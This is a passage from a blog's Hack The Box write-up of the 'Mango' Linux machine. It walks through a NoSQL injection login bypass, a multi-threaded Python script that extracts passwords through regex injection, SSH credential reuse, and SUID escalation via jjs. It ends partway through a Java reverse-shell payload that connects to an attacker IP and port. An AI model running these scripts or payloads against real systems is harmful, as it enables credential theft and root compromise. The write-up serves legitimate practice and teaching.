@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Medium] - Mango | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Medium] - Mango" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/10/11/Mango.html" />
+<meta property="og:url" content="http://localhost:4000/2022/10/11/Mango.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-11T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Medium] - Mango" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-11T00:00:00+02:00","datePublished":"2022-10-11T00:00:00+02:00","headline":"HTB Writeup [Linux - Medium] - Mango","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/10/11/Mango.html"},"url":"http://localhost:4000/2022/10/11/Mango.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Medium] - Mango</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-10-11T00:00:00+02:00" itemprop="datePublished">Oct 11, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Mango/Mango.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Mango</strong> is a <strong>Linux box</strong> where both <strong>HTTP and HTTPS websites</strong> are hosted.</li>
+  <li><em>While inspecting the site’s</em> <strong><em>SSL certificate</em></strong>, we notice another <strong>virtual host.</strong></li>
+  <li>That <strong>vhost</strong> had a <strong>login page</strong> on HTTP which happened to <strong>vulnerable to NoSQL injection.</strong></li>
+  <li><em>After logging in with an</em> <strong><em>Authentication Bypass,</em></strong> we found the site <strong><em>still under construction.</em></strong></li>
+  <li><em>Without any functionality to abuse,</em> we turned to <strong>NoSQL’s built-in regex capability</strong> to <strong>enumerate the usernames and passwords</strong> on the web app <strong><em>in hopes of reusing them with SSH.</em></strong></li>
+  <li><em>Since</em> <strong><em>retrieving passwords manually</em></strong> <em>was time consuming,</em> we <strong>wrote a Python script</strong> to <strong>automate the process</strong> and <strong>further developed it</strong> for <strong>multi-threading support</strong> <strong><em>(it ran 9X faster.)</em></strong></li>
+  <li>We were able to get <strong>credentials for two usernames</strong>: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">mango</code>. The <code class="language-plaintext highlighter-rouge">mango</code> user had <strong>SSH access</strong> which we leveraged to access the box.</li>
+  <li><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user using <code class="language-plaintext highlighter-rouge">su</code> because <strong><em>had the same password.</em></strong></li>
+  <li><em>While trying to</em> <strong><em>escalate our privileges</em></strong>, we found an <strong>SUID binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> which we <strong>exploited</strong> with the help of <a href="https://gtfobins.github.io/">GTFOBins</a> <em>-and some minor tweaks-</em> to become <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+</code></pre></div></div>
+<p><em>From the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>port scan,</em> we see <strong>SSH, HTTP &amp; HTTPS</strong> ports open.</p>
+
+<p>But we also notice that the <code class="language-plaintext highlighter-rouge">ssl-cert</code> script shows a <strong>virtual host</strong>: <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code></p>
+
+<h2 id="checking-the-websites">Checking the Websites</h2>
+<p><em>To handle</em> <strong><em>Virtual Host Routing,</em></strong> We <strong>add an entry</strong> in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file for both the <strong>TLD</strong> <code class="language-plaintext highlighter-rouge">mango.htb</code> and the <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <strong>subdomain</strong>.</p>
+
+<p><img src="/assets/Mango/etc-hosts.jpg" alt="" /></p>
+
+<p>visting <code class="language-plaintext highlighter-rouge">mango.htb</code> only gets us a <strong>valid page</strong> on the <strong>HTTPS site</strong>. The <strong>HTTP</strong> one gives back a <strong>403 forbidden response</strong> <em>as we’ve seen from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output.</em></p>
+
+<p><img src="/assets/Mango/mango-htb-sites.jpg" alt="" /></p>
+
+<p>The <strong>search function</strong> suggests testing for <strong>SQL Injection</strong>. <em>To do so,</em> we <strong>intercept the request</strong> and <strong>save it to a file.</strong></p>
+
+<p><img src="/assets/Mango/search-sqli-request.jpg" alt="" /></p>
+
+<p>then pass it to <code class="language-plaintext highlighter-rouge">sqlmap</code> using the <code class="language-plaintext highlighter-rouge">-r</code> flag as well as the <code class="language-plaintext highlighter-rouge">--force-ssl</code> flag to <strong>target HTTPS.</strong></p>
+
+<p><img src="/assets/Mango/sqlmap-search.jpg" alt="" /></p>
+
+<p>Doing this <strong><em>doesn’t yield back any results :/</em></strong></p>
+
+<p><em>Afterward,</em> we attempted to <strong>abuse any of the available functions</strong> in the <code class="language-plaintext highlighter-rouge">analytics.php</code> page. (<strong><em>like checking for SSRF</em></strong>)</p>
+
+<p><img src="/assets/Mango/analytics-page-testing.jpg" alt="" /></p>
+
+<p><em>but without no luck there as well.</em></p>
+
+<p><em>Moving on, we look at the</em> <strong>HTTP version</strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <em>virtual host,</em> we found a <strong>login page.</strong></p>
+
+<p><img src="/assets/Mango/http-subdomain.jpg" alt="" /></p>
+
+<p><em>After intercepting the request,</em> we attempted injecting <strong>common SQL Injection payloads</strong> but they <em>didn’t work.</em></p>
+
+<p><em>So intead,</em> we tried <strong>NoSQL methods for bypassing authentication</strong> like using the not equal (<code class="language-plaintext highlighter-rouge">$ne</code>) directive.</p>
+
+<p><em>By setting</em> <strong><em>both the username and password</em></strong> <em>to</em> <strong><em>values we’re sure don’t exist in the database</em></strong> <em>(ex: test/test),</em> the check <strong>should evaluate to</strong> <code class="language-plaintext highlighter-rouge">true</code> and let us log in.</p>
+
+<p><img src="/assets/Mango/nosqli-auth-bypass.jpg" alt="" /></p>
+
+<p><strong>It worked!</strong> and we got a <strong>302 response.</strong> we <strong>followed the redirection</strong> to get this page:</p>
+
+<p><img src="/assets/Mango/login-success-page.jpg" alt="" /></p>
+
+<p>we get a <strong>potential username</strong> here: <code class="language-plaintext highlighter-rouge">admin</code></p>
+
+<p><em>other than that,</em> there was <strong>nothing here to played with.</strong></p>
+
+<h2 id="exploiting-nosql-injection-to-get-credentials">Exploiting NoSQL Injection to Get Credentials</h2>
+
+<p><strong><em>Still,</em></strong> having a <strong>NoSQL Injection</strong> means we can <strong><em>abuse</em></strong> the <code class="language-plaintext highlighter-rouge">$regex</code> directive to <strong>enumerate any usernames/passwords.</strong></p>
+
+<p>Our plan here is to <strong>obtain creds</strong> and <strong>try them with SSH</strong> to <strong>exploit any reuse.</strong></p>
+
+<p><em>To check the</em> <strong><em>first character</em></strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">admin</code> <em>user’s password,</em> we can <strong>supply a regular expression</strong> like below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password[$regex]=^a
+</code></pre></div></div>
+
+<p>The above regex would <strong><em>be evaluated</em></strong> to see if the <strong>password starts</strong> with the letter “a” or not.</p>
+
+<ul>
+  <li><strong><em>if the pattern matches,</em></strong> we would get the <strong>302 redirect</strong> and <strong>get authenticated.</strong></li>
+  <li><strong><em>if not,</em></strong> we should get a <strong><em>different response.</em></strong></li>
+</ul>
+
+<p>Let’s <strong>give it a try</strong> using <strong>Burp</strong></p>
+
+<p><img src="/assets/Mango/nosql-enum-incorrect-first-letter.jpg" alt="" /></p>
+
+<p>we get a <strong>200 OK</strong>. this means that <strong>the password doesn’t start with the letter “a”.</strong></p>
+
+<p><strong><em>But, when trying different letters…</em></strong></p>
+
+<p><img src="/assets/Mango/nosql-enum-correct-first-letter.jpg" alt="" /></p>
+
+<p>the response is a <strong>302 redirect</strong> when we <strong>put the first letter as “t”</strong>. which means it’s <strong>the first character</strong> of the <code class="language-plaintext highlighter-rouge">admin</code> user’s password.</p>
+
+<p>Doing this process <strong><em>manually</em></strong> can take a lot of time. That’s <strong>especially true with passwords</strong> since we have to <strong>test all uppercase/lowercase letters in addition to all digits and symbols.</strong></p>
+
+<p><em>That’s why,</em> we <strong>wrote a Python script</strong> to <strong><em>automate the process</em></strong> and <strong><em>even used multi-threading</em></strong> to <strong>make it go faster</strong>.</p>
+
+<p><strong>Note:</strong></p>
+<ul>
+  <li><em>For brevity,</em> the code below is <strong>mainly for obtaining passwords</strong>. But the <strong><em>same concept applies to enumerating usernames (the code for that is commented out).</em></strong></li>
+  <li>I <strong>put comments</strong> to <strong>explain the script</strong> at every point. you’re <strong>advised to read those</strong> to <strong>figure out the logic.</strong></li>
+  <li><em>Lastly,</em> I <strong>divided the script</strong> into <strong>three parts</strong> to <strong>make it easier to grasp.</strong></li>
+</ul>
+
+<h3 id="the-1st-part-importing-the-required-libraries-and-the-test-function">The 1st Part: Importing the required libraries and the “test” function</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+<span class="kn">import</span> <span class="nn">string</span> <span class="c1"># includes the needed character sets
+</span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="c1"># a function that takes in a character as input and tests if the password starts with it or not
+</span><span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+	<span class="c1"># the password variable is defined globally to be accessible everywhere and to be populated
+</span>	<span class="k">global</span> <span class="n">password</span>
+	<span class="c1"># the regex payload, notice that we keep appending the character in question to the end of the already discovered part of the password
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">character</span><span class="si">}</span><span class="s">"</span>
+	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://staging-order.mango.htb/'</span>
+	<span class="c1"># filling out the post data with the supplied username and character
+</span>	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">'username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+		<span class="s">'password[$regex]'</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+		<span class="s">'login'</span><span class="p">:</span> <span class="s">'login'</span>
+	<span class="p">}</span>
+	<span class="s">"""
+	# here's the post data if you want to enumerate usernames
+	data = {
+		'username[$regex]': payload,
+		'password[$ne]': '',
+		'login': 'login'
+	}
+	"""</span>
+	<span class="c1"># special print function for a cool effect
+</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[*] the password for "</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">" is... "</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">character</span><span class="p">),</span> <span class="n">flush</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+	<span class="c1"># sending the request without following redirects
+</span>	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+	<span class="c1"># return true if the status code is the 302 redirection
+</span>	<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+		<span class="k">return</span> <span class="bp">True</span>
+
+</code></pre></div></div>
+<h3 id="the-2nd-part-creating-the-worker-functions-7-total-to-evenly-distribute-and-iterate-over-all-characters-in-parallel">The 2nd Part: Creating the worker functions (7 total) to evenly distribute and iterate over all characters in parallel</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 1st half of the lowercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_L1</span><span class="p">():</span>
+	<span class="c1"># the catch variable represents a valid character found, this is used for stopping all workers when a match is found instead of continuing to search
+</span>	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">13</span><span class="p">]:</span>
+		<span class="c1"># if the catch variable isn't empty (i.e another worker caught the right character), be a smart worker and stop searching ;]
+</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="c1"># if the test function returns true, set the catch variable and stop searching :D
+</span>		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of the lowercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_L2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 1st half of the uppercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_U1</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">26</span><span class="p">:</span><span class="mi">39</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>			
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of the uppercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_U2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">39</span><span class="p">:</span><span class="mi">53</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>			
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># numbers (10 total)
+</span><span class="k">def</span> <span class="nf">numbers</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">digit</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">digit</span>
+			<span class="k">break</span>
+
+<span class="c1"># 1st half of symbols (16 total)
+</span><span class="k">def</span> <span class="nf">symbols_1</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="c1"># these symbols are escaped because they have connotations in the regular expressions language
+</span>		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of symbols (16 total)
+</span><span class="k">def</span> <span class="nf">symbols_2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>	
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
+			<span class="k">break</span>
+</code></pre></div></div>
+<h3 id="the-3rd-part-starting-the-workers-and-letting-them-retrieve-the-passwords-for-both-usernames">The 3rd Part: Starting the workers and letting them retrieve the passwords for both usernames</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># we target both the admin and the mango users, we enumerated the latter using the alternative code above in the test function
+</span><span class="n">target_users</span> <span class="o">=</span> <span class="p">[</span><span class="s">"admin"</span><span class="p">,</span> <span class="s">"mango"</span><span class="p">]</span>
+
+<span class="c1"># foreach user, start with an empty password/catch variables
+</span><span class="k">for</span> <span class="n">target_user</span> <span class="ow">in</span> <span class="n">target_users</span><span class="p">:</span>
+	<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
+	<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="c1"># add each of worker functions to the threads array
+</span>	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">numbers</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+
+		<span class="c1"># start the workers
+</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+			<span class="n">worker</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+		<span class="c1"># wait for workers to finish
+</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+			<span class="n">worker</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+
+		<span class="c1"># if there was no catch, break because that means we have the complete password
+</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+			<span class="k">break</span>
+		<span class="c1"># if there was a catch, append it to the password and clear out the variable
+</span>		<span class="n">password</span> <span class="o">+=</span> <span class="n">catch</span>
+		<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="c1"># print out the password at the end for each user
+</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[+] the password for "</span> <span class="o">+</span> <span class="n">target_user</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">password</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">25</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Here’s <strong><em>what the script looks like during run-time:</em></strong></p>
+
+<p><img src="/assets/Mango/getting-passwords.gif" alt="" /></p>
+
+<p><strong>pretty cool, huh? :]</strong></p>
+
+<p><strong><em>to compare its performance,</em></strong> we prepended the <code class="language-plaintext highlighter-rouge">time</code> command to both scripts.</p>
+
+<p>This version <strong>finished enumerating both passwords</strong> in <strong>1 minute and 5 seconds.</strong></p>
+
+<p><img src="/assets/Mango/time-for-multi-threaded-python-script.jpg" alt="" /></p>
+
+<p>which is a <strong>huge improvement</strong> from the <strong>single-threaded version</strong> which <strong>needed almost 9 minutes!</strong></p>
+
+<p><img src="/assets/Mango/time-for-single-threaded-python-script.jpg" alt="" /></p>
+
+<h2 id="gaining-foothold-and-pivoting">Gaining Foothold and Pivoting</h2>
+<p><em>Moving on,</em> <em>when we tried to log in as</em> <code class="language-plaintext highlighter-rouge">admin</code>, it didn’t work. The <code class="language-plaintext highlighter-rouge">mango</code> user had access though.</p>
+
+<p><img src="/assets/Mango/ssh-as-mango.jpg" alt="" /></p>
+
+<p><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user with <code class="language-plaintext highlighter-rouge">su</code> since <strong><em>he was using the same password</em></strong> we found.</p>
+
+<p><img src="/assets/Mango/pivot-to-admin-user.jpg" alt="" /></p>
+
+<h2 id="suid-privilege-escalation">SUID Privilege Escalation</h2>
+
+<p><em>Looking for easy setuid wins,</em> We ran the <code class="language-plaintext highlighter-rouge">find</code> command below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-ls</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>and found a <strong>strange binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> with the <strong>SUID bit</strong> set:</p>
+
+<p><img src="/assets/Mango/jjs-suid-found.jpg" alt="" /></p>
+
+<p>We <strong>looked it up</strong> and found the below <strong>description</strong> on <a href="https://docs.oracle.com/en/java/javase/13/docs/specs/man/jjs.html">Oracle Docs</a>. It was <strong>exactly what we needed</strong> <strong><em>*evil smile*</em></strong></p>
+
+<p><img src="/assets/Mango/jjs-command.jpg" alt="" /></p>
+
+<p><em>To check for ways to exploit it,</em> we searched <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFOBins</a> and found the below:</p>
+
+<p><img src="/assets/Mango/jjs-on-gtfo-bins.jpg" alt="" /></p>
+
+<p>Seems <strong>pretty straightforward</strong>. A <strong>standard Java reverse shell payload</strong>.</p>
+
+<p><strong>An Important Note:</strong> <em>to</em> <strong><em>inherit the permissions</em></strong> <em>from the</em> <code class="language-plaintext highlighter-rouge">jjs</code> <em>binary and</em> <strong><em>get code execution as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, we have to <strong>modify the payload</strong> on the <strong>6th line</strong> and call <code class="language-plaintext highlighter-rouge">bash</code> with the <code class="language-plaintext highlighter-rouge">-p</code> flag instead.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">RHOST</span><span class="o">=</span>10.10.16.9
+<span class="nb">export </span><span class="nv">RPORT</span><span class="o">=</span>9000
+<span class="nb">echo</span> <span class="s1">'var host=Java.type("java.lang.System").getenv("RHOST");
+var port=Java.type("java.lang.System").getenv("RPORT");
+var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
+var p=new ProcessBuilder("/bin/bash", "-p").redirectErrorStream(true).start();
+var Socket = Java.type("java.net.Socket");
+var s=new Socket(host,port);
